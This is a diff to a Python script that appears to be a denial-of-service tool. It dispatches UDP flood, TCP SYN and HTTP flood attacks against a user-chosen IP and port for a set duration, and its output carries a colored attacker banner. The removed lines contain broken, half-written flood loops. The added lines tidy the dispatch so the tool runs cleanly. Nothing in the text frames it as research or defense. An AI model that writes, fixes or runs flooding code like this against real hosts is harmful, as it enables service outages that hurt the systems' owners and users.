@@ -105,20 +105,10 @@ if __name__ == "__main__":
     if attack_type == 'UDP':
         udp_attack(target_ip, target_port, duration)
         print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack has on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
-    while time.time() < end_time:
-        udp_socket.sendto(packet_data, (target_ip, target_port))
-        packets_sent += 1
-        print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» UDP attack completed. Total packets sent: {Fore.LIGHTGREEN_EX}{packets_sent}.")
-        
-        elif attack_type == 'TCP':
-           tcp_syn_attack(target_ip, target_port, duration)
-           print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
-    while time.time() < end_time:
-        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-           packets_sent += 1
-           print(f"{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}_{Fore.LIGHTBLUE_EX}» TCP SYN attack completed. Total connection attempts: {Fore.LIGHTGREEN_EX}{packets_sent}.")
-        
+    
+    elif attack_type == 'TCP':
+        tcp_syn_attack(target_ip, target_port, duration)
+        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
         
     elif attack_type == 'HTTP':
         asyncio.run(http_flood_attack(target_ip, target_port, duration))
